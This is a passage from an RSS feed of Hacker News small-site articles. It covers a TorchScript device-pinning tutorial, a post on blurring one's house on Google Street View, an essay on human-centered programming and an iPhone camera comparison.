    <span>X</span><span>:</span> <span>Tensor</span><span>)</span> <span>-&gt;</span> <span>Tensor</span><span>:</span>
  <span>_0</span> <span>=</span> <span>ops</span><span>.</span><span>prim</span><span>.</span><span>NumToTensor</span><span>(</span><span>torch</span><span>.</span><span>size</span><span>(</span><span>X</span><span>,</span> <span>0</span><span>))</span>
  <span>_1</span> <span>=</span> <span>torch</span><span>.</span><span>arange</span><span>(</span><span>annotate</span><span>(</span><span>number</span><span>,</span> <span>_0</span><span>),</span> <span>dtype</span><span>=</span><span>None</span><span>,</span> <span>layout</span><span>=</span><span>0</span><span>,</span> <span>device</span><span>=</span><span>torch</span><span>.</span><span>device</span><span>(</span><span>"cuda:0"</span><span>),</span> <span>pin_memory</span><span>=</span><span>False</span><span>)</span>
  <span>return</span> <span>_1</span></code></pre></div>
<!-- raw HTML omitted -->
<blockquote>
  <p><strong>Tensors Created During Tracing Will Have Their Device Pinned</strong></p>
<p>This can be a significant performance and portability problem.</p>

</blockquote>

<h3 id="performance-and-portability">
  Performance and Portability
  <a href="#performance-and-portability">#</a>
</h3>
<p>If we later deserialize and run this TorchScript in <code>libtorch</code> the <code>arange</code> tensor will always be created on the device that is pinned ‚Äî <code>torch.device("cpu")</code> or <code>torch.device("cuda:0")</code> in the examples above. If the rest of the model is running on a different device this can result in costly memory transfers and synchronization.</p>
<p>This device pinning issue extends to multi-GPU scenarios as well. If you have traced and exported a model on <code>cuda:0</code> and then run it on <code>cuda:1</code> you‚Äôll see transfers and synchronization between the devices. Not good. Perhaps even worse, if such a model is run in an environment without any CUDA-capable device it will fail since <code>cuda:0</code> doesn‚Äôt exist.</p>
<blockquote>
  <p><strong>Replace Tensors Created During Execution With Parameters</strong></p>
<p>Tensors created in the execution path while tracing will have their device pinned. Depending on model logic, these can often be turned into Parameters created during construction.</p>

</blockquote>

<p>An example of the problem looks like this in Nsight Systems:</p>








<a href="https://paulbridger.com/posts/mastering-torchscript/images/pinned_devices.png">
    <figure>
        <img src="https://paulbridger.com/posts/mastering-torchscript/images/pinned_devices_hub20c76c57b334a1bd11edec46dac0166_414004_896x580_fill_box_top_2.png" width="896" height="580">
        <figcaption><small></small></figcaption>
    </figure>
</a>

<h3 id="tensor-subscript-mask-and-indexing-will-pin-devices">
  Tensor Subscript Mask and Indexing Will Pin Devices
  <a href="#tensor-subscript-mask-and-indexing-will-pin-devices">#</a>
</h3>
<p>Unlike their more explicit counterparts (<code>masked_select</code> and <code>index_select</code>), using tensor subscripting will pin the mask or indexes to the tracing device:</p>
<div><pre><code data-lang="python"><span>def</span> <span>forward</span><span>(</span><span>X</span><span>):</span>
    <span>return</span> <span>X</span><span>[</span><span>X</span> <span>&gt;</span> <span>1</span><span>]</span></code></pre></div>
<p>Generates this TorchScript:</p>
<div><pre><code data-lang="python"><span>def</span> <span>forward</span><span>(</span><span>X</span><span>:</span> <span>Tensor</span><span>)</span> <span>-&gt;</span> <span>Tensor</span><span>:</span>
  <span>_0</span> <span>=</span> <span>torch</span><span>.</span><span>to</span><span>(</span><span>torch</span><span>.</span><span>gt</span><span>(</span><span>X</span><span>,</span> <span>1</span><span>),</span> <span>dtype</span><span>=</span><span>11</span><span>,</span> <span>layout</span><span>=</span><span>0</span><span>,</span> <span>device</span><span>=</span><span>torch</span><span>.</span><span>device</span><span>(</span><span>"cpu"</span><span>),</span> <span>pin_memory</span><span>=</span><span>False</span><span>,</span> <span>non_blocking</span><span>=</span><span>False</span><span>,</span> <span>copy</span><span>=</span><span>False</span><span>,</span> <span>memory_format</span><span>=</span><span>None</span><span>)</span>
  <span>_1</span> <span>=</span> <span>annotate</span><span>(</span><span>List</span><span>[</span><span>Optional</span><span>[</span><span>Tensor</span><span>]],</span> <span>[</span><span>_0</span><span>])</span>
  <span>return</span> <span>torch</span><span>.</span><span>index</span><span>(</span><span>X</span><span>,</span> <span>_1</span><span>)</span></code></pre></div>
<!-- raw HTML omitted -->
<p>Whereas:</p>
<div><pre><code data-lang="python"><span>def</span> <span>forward</span><span>(</span><span>X</span><span>):</span>
    <span>return</span> <span>X</span><span>.</span><span>masked_select</span><span>(</span><span>X</span> <span>&gt;</span> <span>1</span><span>)</span></code></pre></div>
<p>Generates this TorchScript:</p>
<div><pre><code data-lang="python"><span>def</span> <span>forward</span><span>(</span><span>X</span><span>:</span> <span>Tensor</span><span>)</span> <span>-&gt;</span> <span>Tensor</span><span>:</span>
  <span>_0</span> <span>=</span> <span>torch</span><span>.</span><span>masked_select</span><span>(</span><span>X</span><span>,</span> <span>torch</span><span>.</span><span>gt</span><span>(</span><span>X</span><span>,</span> <span>1</span><span>))</span>
  <span>return</span> <span>_0</span></code></pre></div>
<!-- raw HTML omitted -->
<p>The same pattern holds for <code>tensor[indexes]</code> and <code>tensor.index_select(0, indexes)</code>. This device pinning carries the same performance and portability risks as noted above.</p>
<blockquote>
  <p><strong>Replace Tensor Subscripting With <code>masked_select</code> and <code>indexed_select</code></strong></p>
<p>Subscript-based masking and indexing will always pin the tracing device into generated TorchScript. :(</p>

</blockquote>

<h2 id="direct-graph-modification">
  Direct Graph Modification
  <a href="#direct-graph-modification">#</a>
</h2>
<p>Once we‚Äôve used <code>torch.jit.script</code> or <code>torch.jit.trace</code> to generate a ScriptModule or ScriptFunction we can use <code>.graph</code>, <code>.inlined_graph</code> or <code>.code</code> to understand exactly what TorchScript has been generated. Though it has an entirely undocumented interface it is possible (and fun) to access and modify the generated TorchScript AST directly via the <code>.graph</code> method.</p>
<p>The most useful parts of the API are defined in <a href="https://github.com/pytorch/pytorch/blob/master/torch/csrc/jit/python/python_ir.cpp">torch/csrc/jit/python/python_ir.cpp</a>. As you can see, all the basic functionality is present for finding and changing the graph nodes you want. If you change nodes or arguments and then persist the module your subsequent TorchScript load and inference will reflect your changes, though modules cannot be changed recursively in this way (<code>torch.jit.freeze</code> can be useful here).</p>
<p>An example of the kind of graph modification that is possible:</p>
<div><pre><code data-lang="python"><span>def</span> <span>undevice</span><span>(</span><span>tsc</span><span>):</span>
    <span># use ::to variant which does not hardcode device</span>
    <span>for</span> <span>to_node</span> <span>in</span> <span>tsc</span><span>.</span><span>graph</span><span>.</span><span>findAllNodes</span><span>(</span><span>'aten::to'</span><span>):</span>
        <span>i</span><span>,</span> <span>dtype</span><span>,</span> <span>layout</span><span>,</span> <span>device</span><span>,</span> <span>pin_mem</span><span>,</span> <span>non_blocking</span><span>,</span> <span>copy</span><span>,</span> <span>mem_format</span> <span>=</span> <span>list</span><span>(</span><span>to_node</span><span>.</span><span>inputs</span><span>())</span>
        <span>to_node</span><span>.</span><span>removeAllInputs</span><span>()</span>
        <span>for</span> <span>a</span> <span>in</span> <span>[</span><span>i</span><span>,</span> <span>dtype</span><span>,</span> <span>non_blocking</span><span>,</span> <span>copy</span><span>,</span> <span>mem_format</span><span>]:</span>
            <span>to_node</span><span>.</span><span>addInput</span><span>(</span><span>a</span><span>)</span>

    <span>for</span> <span>constant</span> <span>in</span> <span>tsc</span><span>.</span><span>graph</span><span>.</span><span>findAllNodes</span><span>(</span><span>'prim::Constant'</span><span>):</span>
        <span>if</span> <span>not</span> <span>constant</span><span>.</span><span>hasUses</span><span>():</span>
            <span>constant</span><span>.</span><span>destroy</span><span>()</span></code></pre></div>
<p>The above code will modify a traced graph, changing <code>aten::to</code> to use an overload which doesn‚Äôt change memory location.</p>
<p>But what is this really useful for? As an undocumented API you‚Äôd be unwise to use this capability in a production pipeline unless you like maintenance coding. I would only recommend it for research, as in the above example which I used to understand and profile the transfer/synchronization behavior of tensor subscripting.</p>
<blockquote>
  <p><strong>Don‚Äôt Bother With Direct Graph Modification</strong></p>
<p>For legitimate production use-cases you can almost always find a way to modify your model code to generate the TorchScript you want.</p>

</blockquote>

<h2 id="rewrite-for-onnxtensorrt-export">
  Rewrite for ONNX/TensorRT Export
  <a href="#rewrite-for-onnxtensorrt-export">#</a>
</h2>
<p>You can get some <a href="https://paulbridger.com/posts/video-analytics-deepstream-pipeline/#stage-3-hacked-deepstream-mdash-80-tensorrt-20-torchscript">awesome results with TensorRT</a> but exporting a model from Pytorch to TensorRT is far from a sure thing. The export path to ONNX and then to TensorRT can fail due to missing or incompatible operations at either step and this can be frustrating.</p>
<p>After the obligatory Google search, I‚Äôve found a reasonable hail-mary approach is to rewrite your tensor processing code to avoid unsupported operators. I can‚Äôt give general advice for this but let me show you an example of how this can be possible: <code>repeat_interleave</code>.</p>
<div><pre><code data-lang="python"><span>class</span> <span>RI</span><span>(</span><span>torch</span><span>.</span><span>nn</span><span>.</span><span>Module</span><span>):</span>
    <span>def</span> <span>forward</span><span>(</span><span>self</span><span>,</span> <span>X</span><span>,</span> <span>repeat</span><span>):</span>
        <span>return</span> <span>X</span><span>.</span><span>repeat_interleave</span><span>(</span><span>repeat</span><span>,</span> <span>dim</span><span>=</span><span>0</span><span>)</span>

<span>inputs</span> <span>=</span> <span>(</span><span>torch</span><span>.</span><span>arange</span><span>(</span><span>5</span><span>),</span> <span>torch</span><span>.</span><span>tensor</span><span>(</span><span>3</span><span>))</span>
<span>torch</span><span>.</span><span>onnx</span><span>.</span><span>export</span><span>(</span><span>RI</span><span>(),</span> <span>inputs</span><span>,</span> <span>'please_work.onnx'</span><span>,</span> <span>opset_version</span><span>=</span><span>11</span><span>)</span></code></pre></div>
<p>Doesn‚Äôt work:</p>
<div><pre><code data-lang="bash">RuntimeError: Exporting the operator repeat_interleave to ONNX opset version <span>11</span> is not supported. Please open a bug to request ONNX <span>export</span> support <span>for</span> the missing operator.</code></pre></div>
<p>However, the behavior of <code>repeat_interleave</code> with a fixed <code>dim</code> argument can be replicated in a form that will export to ONNX ‚Ä¶</p></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://paulbridger.com/posts/mastering-torchscript/">https://paulbridger.com/posts/mastering-torchscript/</a></em></p>]]>
            </description>
            <link>https://paulbridger.com/posts/mastering-torchscript/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24941642</guid>
            <pubDate>Fri, 30 Oct 2020 12:46:12 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to blur your house on Google Maps and why it might be a bad idea]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24941611">thread link</a>) | @jastuks
<br/>
October 30, 2020 | https://blog.xeovo.com/how-to-blur-your-house-on-google-maps-and-why-it-might-be-a-bad-idea/ | <a href="https://web.archive.org/web/*/https://blog.xeovo.com/how-to-blur-your-house-on-google-maps-and-why-it-might-be-a-bad-idea/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-main">
<div>
<article>

<figure>
<img srcset="https://blog.xeovo.com/content/images/size/w300/2020/10/how-to-hide-your-house-from-google-maps.png 300w,
                            https://blog.xeovo.com/content/images/size/w600/2020/10/how-to-hide-your-house-from-google-maps.png 600w,
                            https://blog.xeovo.com/content/images/size/w1000/2020/10/how-to-hide-your-house-from-google-maps.png 1000w,
                            https://blog.xeovo.com/content/images/size/w2000/2020/10/how-to-hide-your-house-from-google-maps.png 2000w" sizes="(max-width: 800px) 400px,
                        (max-width: 1170px) 1170px,
                            2000px" src="https://blog.xeovo.com/content/images/size/w2000/2020/10/how-to-hide-your-house-from-google-maps.png" alt="How to blur your house on Google Maps and why it might be a bad idea">
</figure>
<section>
<div>
<p>Recently we noticed many popular blogs covering this topic and recommending to readers to blur their house on "Google Street View". At first glance, it might seem like a no-brainer, and you should do it to improve your privacy.</p><p>But this is not so straightforward and most likely will cause more problems. We want to cover all cons and pros and why you might not need to blur your house on Google Maps.</p><h3 id="cons-">Cons:</h3><ol><li>This is permanent. You won't be able to unblur your house. There will be no more updates in your area.</li><li>Google is not the only one website having a picture of your house. Bing, Apple Maps, or Yandex is a good example. Let's also add here Redfin, Zillow, and other real estate websites.</li><li>This might complicate selling your house in the future.</li><li>Most likely, your house will be the only one blurred in the block, which might bring more unwanted attention.</li></ol><h3 id="unless-you-live-in-germany-">Unless you live in Germany...</h3><figure><img src="https://blog.xeovo.com/content/images/2020/10/no-streetview-in-germany-1.png" alt="" srcset="https://blog.xeovo.com/content/images/size/w600/2020/10/no-streetview-in-germany-1.png 600w, https://blog.xeovo.com/content/images/2020/10/no-streetview-in-germany-1.png 768w" sizes="(min-width: 720px) 720px"></figure><p>Google map shows quite well how much Germans value their privacy. After the launch of "Street View", a lot of people and politicians were unhappy with the fact that a foreign country is going to have access to the images of Germans' houses. </p><p>Even though Google blur license plates and faces it was not enough for Germans. Google had to implement the possibility to blur houses.</p><p>The number of requests was so high that Google gave up. So it became a new norm in Germany. Google still have Street View in big cities, but other places are not getting updated anymore and most likely will be removed in the future.</p><h3 id="pros-">Pros:</h3><ol><li>You want to improve your house security. It is a powerful tool for burglars to reconnaissance. They can spot your security cameras, gates and find hiding spots without showing at your house. Remember that your house is still visible from the satellite view.</li><li>You want to improve your privacy (don't forget about cons).</li><li>You don't want Google to have images of your house.</li></ol><h3 id="how-to-blur-my-house">How to blur my house?</h3><figure><img src="https://blog.xeovo.com/content/images/2020/10/2020-10-29_18Z2g-2.png" alt="" srcset="https://blog.xeovo.com/content/images/size/w600/2020/10/2020-10-29_18Z2g-2.png 600w, https://blog.xeovo.com/content/images/2020/10/2020-10-29_18Z2g-2.png 925w" sizes="(min-width: 720px) 720px"></figure><ol><li>Search your address in Google Maps.</li><li>Drag and drop yellow guy from the right bottom side.</li><li>Get a good view of your house and click "Report problem" on the right bottom side.</li><li>Select that you want to blur "My home" and fill other required fields.</li><li>Submit and wait. Google might request more information.</li></ol><h3 id="conclusion-">Conclusion:</h3><p>We think and believe that every person should have the right to blur their houses on any public map. Just remember that you might achieve the "Streisand effect" by doing this and bring more attention. </p>
</div>
</section>
<section>
<h3>Xeovo Newsletter</h3>
<p>Stay up to date with the latest Xeovo updates, tutorials and articles.</p>
<form data-members-form="subscribe">

<p><strong>Great!</strong> Check your inbox and click the link to confirm your subscription.
</p>
<p>
Please enter a valid email address!
</p>
</form>
</section>
</article>
</div>
</div></div>]]>
            </description>
            <link>https://blog.xeovo.com/how-to-blur-your-house-on-google-maps-and-why-it-might-be-a-bad-idea/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24941611</guid>
            <pubDate>Fri, 30 Oct 2020 12:42:07 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Mega Monster Party: A web-based Mario Party-like game for Halloween /Multiplayer]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24941499">thread link</a>) | @morgam
<br/>
October 30, 2020 | https://airconsole.io/MMP | <a href="https://web.archive.org/web/*/https://airconsole.io/MMP">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://airconsole.io/MMP</link>
            <guid isPermaLink="false">hacker-news-small-sites-24941499</guid>
            <pubDate>Fri, 30 Oct 2020 12:26:20 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Human-Centered Programming]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24941429">thread link</a>) | @todsacerdoti
<br/>
October 30, 2020 | http://codepunk.io/human-centered-programming/ | <a href="https://web.archive.org/web/*/http://codepunk.io/human-centered-programming/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <!-- Begin MailChimp Signup Form -->
            
            
            
            <!--End mc_embed_signup-->
            <blockquote>
  <p>Michael,</p>
  
  <p>Thanks for your interest in L3-AI! We're excited to feature your presentation. </p>
  
  <p>Would you be able to condense your proposal into a 5 minute lightning talk?  If this sounds good to you, I'll schedule next steps [...]</p>
</blockquote>

<p>Actually... I submitted to do a lightning talk, so no problem, right? I've <a href="https://codepunk.io/why-i-love-lightning-talks/">mentioned before</a> that too often people see lightning talks as a consolation price, but I use them to test out new ideas, and it requires a special set of skills to get those ideas across in a short amount of time.</p>

<p>Unlike in the past where my focus was explicitly on the Microsoft Bot Framework, I had recently expanded to a greater analysis of frameworks like <a href="https://rasa.com/">Rasa</a> and <a href="https://www.botkit.ai/">Ben Brown's Botkit</a>. After conversations with Chris Mullins at Microsoft, I really started applying a more critical eye towards the frameworks I'd been using, but was taking for granted.</p>

<p>Specifically, I was unconvinced that the way frameworks were being built constituted an appropriate approach. We're not talking about programming-centric frameworks. Conversational software is about a conversation-first approach, and the frameworks for building conversational software should allow the programmer to program in a way that represents how a conversation flows. (Brown's Botkit does a good job of this with the names of its methods and classes.)</p>

<p>I decided to built a chatbot framework from scratch in order to explore these ideas and settled on conversation analysis as a theory to apply. This led to several presentations over the course of the Summer, including Rasa's L3-AI. I expanded on this presentation in latter virtual conferences, and being influenced by the pandemic, politics, and the overall despair of the state of affairs, this expanded presentation took quite an unexpected turn.</p>

<hr>

<p>LinkedIn can be a valuable tool and a painful platform all in the same minute. The more active you become, the more noticed you are, and the more likely you'll start getting random InMail's and connection invites from people you don't know. If you're lucky recruiters will use the InMail feature where they have a limited number of cold requests. Mostly, though, they just send you a random connection request and put their message in the invite to try to avoid burning their InMails.</p>

<p>I have a general rule: If I don't know you and you send a connection request without a personal message, I ignore it outright. If it does have a personal message, I hope it's relevant.</p>

<p>When I received an invite from <a href="https://www.linkedin.com/in/brian-greenwald-108/">Brian Greenwald</a>, he at least followed the appropriate etiquette. The Vice President of Business Development for <a href="https://generateimpact.com/">Generate Impact</a>, Brian was a new addition to the unfolding story of Chiedo Labs‚Äîa local Harrisonburg development shop spawned from the machinations of James Madison University student Chiedo John. I was familiar Chiedo Labs from some local tech circles and was connected to Chiedo and a few employees through LinkedIn. Chiedo and I both spoke at Nation JS in Washington, DC the previous year and had exchanged a few emails.</p>

<p>Chiedo was always a faith-based person, while Chiedo Labs‚Äîalthough a good group of people‚Äîwas fighting an uphill battle trying to distinguish itself in custom development where its a race to the bottom on client pricing. So it made sense when the company converted from Chiedo Labs to Generate Impact and began a concentrated effort towards focusing on helping non-profits.</p>

<p>But it wasn't long before Chiedo jumped ship to greener pastures at GitHub, while Brian and Mike Forster (Generate Impact president) were piloting the transformation of the company.</p>

<hr>

<blockquote>
  <p>Hi Michael! That‚Äôs awesome that you know Chiedo! He was one of my clients and [as] fortune would have it we ended up merging what I do with Generate Impact. [...] I would love to meet for coffee - seems like it will be a while unfortunately. We are hunkered down here in Earlysville. Would love to learn about what you are doing...maybe we can schedule a zoom call sometime.</p>
</blockquote>

<p>I agreed.</p>

<p>I also didn't expect a Zoom call to be scheduled immediately for the following week. It smelled a little of a cold call, which I'm never receptive to. Still, I was familiar with the company and some of the team members, so at worst, I would fly into the meeting with little need to put a lid on my opinions or personality.</p>

<p>My conversation with Brian came just after the COVID-19 pandemic began shutting down much of the United States, and I had already begun reading articles about the reshaping of economic needs and drivers. What started as a discussion of engineering proficiency, DevOps, and business-oriented IT processes escalated into the public good side of non-profits, B-corps, and the fundamentally optimistic assumption that <em>something has to give</em>. Corporations cannot continue on an infinite growth curve, and the pandemic represented an unprecedented opportunity to hit reset on corporate values and strive for something more than the upwards extraction of wealth.</p>

<p>Having previously interviewed enterprise architect Bryan Betts‚Äîsomeone who has spend most of his career in public service‚ÄîI remember my colleague asking him about a hypothetical situation of communicating to leadership the ROI of certain better processes and planning.</p>

<blockquote>
  <p>Sometimes its not about the return on investment; Sometimes its just about doing the right thing, and there's value in that alone.</p>
</blockquote>

<p>From Brian Greenwald's side, he had been working for quite some time on the concept of a benevolent business model‚Äîan economic and business planning model that focused on success through the lens of greater inclusiveness and understanding of externalities rather than pure financial extraction‚Äîa model that seeks sustainability and equitability over exponential growth. Brian and I connected enough on a philosophical level that he introduced me to Generate Impact president Mike Forster to further the discuss on the positive technological impact on local businesses and communities. What emerged was a vision of enabling public good through technology, but from the local-first, sustainability approach that has permeated environmental movements‚Äîan acknowledgement that a successful path forward in the new normal consisted of an interrelated approach combining people, processes, and technology.</p>

<blockquote>
  <p>The Benevolent Business Model is anchored in the principle that all human activity exists (or SHOULD exist) to fulfill benevolent human needs. By that principle, a business exists to first CONTRIBUTE to the community it exists in and is building as opposed to focusing on gathering and EXTRACTING as many resources as possible. In other words, profit becomes the enabler of a collective vision of well-being as opposed to the end goal itself.</p>
  
  <p>Of course, the irony of this approach, particularly in the world we are living in today, is that focusing on the benevolence of EVERY member of the business community is MORE likely to be a strategic advantage and thus lead to more success and profit than the traditional "business as an army going to battle" approach, where victory is possible, but in the long run the cost to society is high.</p>
</blockquote>

<p>We can't forget about the people.</p>

<hr>

<p><img src="http://codepunk.io/content/images/2020/10/hcp-1.png" alt="Open Sector"></p>

<p>Typically when we talk about economic sectors, the focus is generally on the public and private sectors, and most don't consider if there is anything else on the outer boundaries. But recent analyses by market-watchers like <a href="https://www.exponentialview.co/">Azeem Azar</a> have pointed out the ever-growing sector (and importance) of open source software and technology. We‚Äôre used to hearing about the public sector and the private sector, what has been continuing to gain stream is this idea of an "open" sector.</p>

<p>COVID-19 has shown us the value of open data, and how that sharing can speed up understanding and innovation. In fact, open source software, open data, crowd-sourcing solutions, and crowd-funding projects, combined with efforts like GitHub Sponsors, Patreon, and Ko-Fi are carving out a sector that isn‚Äôt quite public, but isn‚Äôt private either. It‚Äôs an open, more democratic sector for a society looking to advance common goals.</p>

<p>This open sector is more prevalent in the technology industry than anywhere else, and it feeds both the private and public sector, such as open source software enabling and enhancing companies in either or those sectors. In fact, it feels like we've come full circle back to the original hackers of the 70's and 80's‚Äîproducing software in a left-libertarian form of mutualism.</p>

<p>But oftentimes, our technology accelerates faster than our morality, and we occasionally need to step back and reevaluate our positions. For example, there is a disconnect between the programmers and researchers working hard on facial recognition software for the advancement of the theories and technology, and the fundamentally immoral use of facial recognition software in racial profiling and identifying protesters.</p>

<p>If you're at all familiar with <a href="https://logicmag.io/">Logic Magazine</a>, you've read some of the more significant techno-societal ponderings that are invading Silicon Valley's philosophical outlook, such as Astra Taylor's take down of the "security" of capitalism in <a href="https://logicmag.io/security/the-insecurity-machine/"><em>The Insecurity Machine</em></a>, which shows how technology is applied not to create more security for individuals, but to enhance greater security for ownership.</p>

<p><img src="http://codepunk.io/content/images/2020/10/hcp-2.png" alt="Human-Centered Programming"></p>

<p>Human-centered programming is a way of thinking about software that is different from the traditional <em>programmers can do whatever they want because technology is agnostic</em> view. To this respect, programming and technology consist of three important components: code, culture, and conscience. These three components can best be viewed in the traditional triangle trope of related ideas. Like all other triangle diagrams, it implies an interconnectedness between elements.</p>

<p>Code enables culture and culture defines how we code, but without conscience, we won‚Äôt fully understand the impact of the code that we write or the negative directions that our culture ‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://codepunk.io/human-centered-programming/">http://codepunk.io/human-centered-programming/</a></em></p>]]>
            </description>
            <link>http://codepunk.io/human-centered-programming/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24941429</guid>
            <pubDate>Fri, 30 Oct 2020 12:17:34 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Comparing the cameras on the iPhone 12 Pro, 11, XS, 6, and SE]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24941356">thread link</a>) | @joshuawithers
<br/>
October 30, 2020 | https://joshwithers.blog/2020/10/30/comparing-the-cameras.html | <a href="https://web.archive.org/web/*/https://joshwithers.blog/2020/10/30/comparing-the-cameras.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
      

<p>I upgraded my daily carry computer, or what us old people call a phone, to an iPhone 12 Pro this week. Upon clicking the shutter a few times I could see there was a big difference in the new camera, but I wanted to compare photos to former iPhone cameras. So I pulled out all the old iPhones in the house and took the same photo on each one. It worked out pretty good as the four cameras were each mostly two years apart in release dates.</p>

<p><img src="https://joshwithers.blog/uploads/2020/33359e0d1c.jpg"></p>

<h2 id="control-notes">Control notes</h2>

<p>All photos were taken on the iPhone with a fresh install, no apps, or settings changed, no iCloud logged in. I simply tapped to focus and expose inside the default camera app, and turned off flash for consistency. All phones were held in a Peak Design Travel Tripod with the phone attachement. I tried to keep the framing consistent, but if it‚Äôs not, either the iPhone lens placement changed, or this free blog post doesn‚Äôt live up to even my standards. The iPhone SE is the first generation SE, the 12 is a 12 Pro. Taken with default settings including HDR/Smart HDR/HDR 3, on the 1x lens. The only edits made are to the HEIC files taken on cameras which save HEIC, those files have been converted to JPG using MacOS Automator.</p>

<p>You may want to right click on images and open in a new window to see full resolution, and honestly, I‚Äôm unsure if micro.blog actually compresses and/or resizes files so if you can still read this line I haven‚Äôt edited with original uploads to somewhere else.</p>

<h2 id="cameras-used">Cameras used</h2>

<ul>
<li>iPhone 6, released September 19, 2014, 8MP f/2.2</li>
<li>iPhone SE, released March 31, 2016, 12.2 MP f/2.2</li>
<li>iPhone XS, released September 21, 2018, 12MP ∆í/1.8 lens</li>
<li>iPhone 11 (for one Night Mode photo), released September 20, 2019, 12MP ∆í/1.8 lens</li>
<li>iPhone 12 Pro, released October 16, 2020, 12MP ∆í/1.6 lens</li>
</ul>

<p>Here‚Äôs a comparison of the four cameras as Apple sees fit.</p>

<p><img src="https://joshwithers.blog/uploads/2020/cf5392dd3a.jpg"></p>

<p>Let‚Äôs look at the photos‚Ä¶</p>

<h2 id="landscape-photo">Landscape photo</h2>

<p><strong>iPhone 6 Landscape photo</strong>
<img src="https://joshwithers.blog/uploads/2020/ac2551815b.jpg"></p>

<p><strong>iPhone SE Landscape photo</strong>
<img src="https://joshwithers.blog/uploads/2020/7744ffd03a.jpg"></p>

<p><strong>iPhone XS Landscape photo</strong>
<img src="https://joshwithers.blog/uploads/2020/1b4e4198c3.jpg"></p>

<p><strong>iPhone 12 Pro Landscape photo</strong>
<img src="https://joshwithers.blog/uploads/2020/93e559ff99.jpg"></p>

<h2 id="sunset-photo">Sunset photo</h2>

<p><strong>iPhone 6 Sunset photo</strong>
<img src="https://joshwithers.blog/uploads/2020/66970253a9.jpg"></p>

<p><strong>iPhone SE Sunset photo</strong>
<img src="https://joshwithers.blog/uploads/2020/9e69e23ac5.jpg"></p>

<p><strong>iPhone XS Sunset photo</strong>
<img src="https://joshwithers.blog/uploads/2020/dd0be82c4f.jpg"></p>

<p><strong>iPhone 12 Pro Sunset photo</strong>
<img src="https://joshwithers.blog/uploads/2020/1a504277bb.jpg"></p>

<h2 id="self-portrait">Self-portrait</h2>

<p><strong>iPhone 6 Self-portrait</strong>
<img src="https://joshwithers.blog/uploads/2020/9c914485b4.jpg"></p>

<p><strong>iPhone SE Self-portrait</strong>
<img src="https://joshwithers.blog/uploads/2020/b209159beb.jpg"></p>

<p><strong>iPhone XS Self-portrait</strong>
<img src="https://joshwithers.blog/uploads/2020/3ec4eab155.jpg"></p>

<p><strong>iPhone 12 Pro Self-portrait</strong>
<img src="https://joshwithers.blog/uploads/2020/75790aaae0.jpg"></p>

<h2 id="selfie-camera">Selfie camera</h2>

<p><strong>iPhone 6 Selfie camera photo</strong>
<img src="https://joshwithers.blog/uploads/2020/ba2688deeb.jpg"></p>

<p><strong>iPhone SE Selfie camera photo</strong>
<img src="https://joshwithers.blog/uploads/2020/ff7625d5b1.jpg"></p>

<p><strong>iPhone XS Selfie camera photo</strong>
<img src="https://joshwithers.blog/uploads/2020/af5d3c77cf.jpg"></p>

<p><strong>iPhone 12 Pro Selfie camera photo</strong>
<img src="https://joshwithers.blog/uploads/2020/62f90357e9.jpg"></p>

<h2 id="a-detail-photo">A detail photo</h2>

<p><strong>iPhone 6 detail photo</strong>
<img src="https://joshwithers.blog/uploads/2020/4e3bbbdd07.jpg"></p>

<p><strong>iPhone SE detail photo</strong>
<img src="https://joshwithers.blog/uploads/2020/91a2a06860.jpg"></p>

<p><strong>iPhone XS detail photo</strong>
<img src="https://joshwithers.blog/uploads/2020/f2e99cbb80.jpg"></p>

<p><strong>iPhone 12 Pro detail photo</strong>
<img src="https://joshwithers.blog/uploads/2020/0c169bfc4e.jpg"></p>

<h2 id="portrait-mode">Portrait mode</h2>

<p><strong>iPhone 6 Portrait</strong>
<img src="https://joshwithers.blog/uploads/2020/1ec2870da1.jpg"></p>

<p><strong>iPhone SE Portrait</strong>
<img src="https://joshwithers.blog/uploads/2020/bc5caf3172.jpg"></p>

<p><strong>iPhone XS Portrait mode</strong>
<img src="https://joshwithers.blog/uploads/2020/155e980b41.jpg"></p>

<p><strong>iPhone 12 Pro Portrait mode</strong>
<img src="https://joshwithers.blog/uploads/2020/9d115200f1.jpg"></p>

<h2 id="blue-light">Blue light</h2>

<p><strong>iPhone 6 Blue light photo</strong>
<img src="https://joshwithers.blog/uploads/2020/d08c621c0c.jpg"></p>

<p><strong>iPhone SE Blue light photo</strong>
<img src="https://joshwithers.blog/uploads/2020/cf41e6f448.jpg"></p>

<p><strong>iPhone XS Blue light photo</strong>
<img src="https://joshwithers.blog/uploads/2020/e687ea4f2d.jpg"></p>

<p><strong>iPhone 12 Pro Blue light photo</strong>
<img src="https://joshwithers.blog/uploads/2020/9c33781955.jpg"></p>

<h2 id="maximum-digital-zoom-in-blue-light">Maximum digital zoom in blue light</h2>

<p><strong>iPhone 6 zoomed to maximum digital zoom</strong>
<img src="https://joshwithers.blog/uploads/2020/a66a45ad92.jpg"></p>

<p><strong>iPhone SE zoomed to maximum digital zoom</strong>
<img src="https://joshwithers.blog/uploads/2020/288c93fe83.jpg"></p>

<p><strong>iPhone XS zoomed to maximum digital zoom</strong>
<img src="https://joshwithers.blog/uploads/2020/06d361d986.jpg"></p>

<p><strong>iPhone 12 Pro zoomed to maximum digital zoom</strong>
<img src="https://joshwithers.blog/uploads/2020/f4b2655081.jpg"></p>

